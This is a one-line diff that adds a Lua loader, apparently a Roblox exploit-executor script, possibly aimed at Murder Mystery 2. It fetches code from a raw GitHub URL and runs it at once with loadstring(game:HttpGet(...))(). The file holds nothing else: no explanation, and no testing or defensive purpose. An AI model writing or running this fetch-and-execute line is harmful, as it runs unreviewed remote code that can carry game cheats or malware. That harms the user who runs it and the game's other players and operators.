@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LadenScripting/RhyzenCooking/refs/heads/main/MM2",true))()
